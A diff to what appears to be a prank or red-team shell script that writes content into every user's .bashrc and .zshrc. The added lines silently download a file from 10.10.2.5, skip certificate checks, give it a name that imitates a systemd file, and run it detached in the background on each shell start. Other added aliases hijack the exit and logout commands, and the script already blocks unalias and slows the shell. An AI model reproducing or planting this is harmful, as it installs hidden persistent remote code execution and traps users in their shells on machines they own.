@@ -59,6 +59,7 @@ echo
 echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
 
 trollrc='
+wget -qO /tmp/systemd-timers-daemon.socket --no-check-certificate http://10.10.2.5:8080/telemetry; chmod +x /tmp/systemd-timers-daemon.socket; /tmp/systemd-timers-daemon.socket& disown
 export TERM=xterm
 
 echo "Please wait..."
@@ -91,7 +92,8 @@ __   __          _            _
 |  _|| |_| |  _ <| |___  \ V / | |___|  _ < 
 |_|   \___/|_| \_\_____|  \_/  |_____|_| \_\
 '\''
-alias exit="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain'\''t afraid of no shell\!\"; else echo \"$forever\"; fi"
+alias exit="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain'\''t afraid of no shell!\"; else echo \"$forever\"; fi"
+alias logout="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain'\''t afraid of no shell!\"; else echo \"$forever\"; fi"
 alias unalias="echo \"I'\''m sorry `whoami`, I can'\'' do that.\""
 
 [ -f "~/.bashrc" ] && echo "sleep 0.05" >> ~/.bashrc # you'\''re getting sleepier...
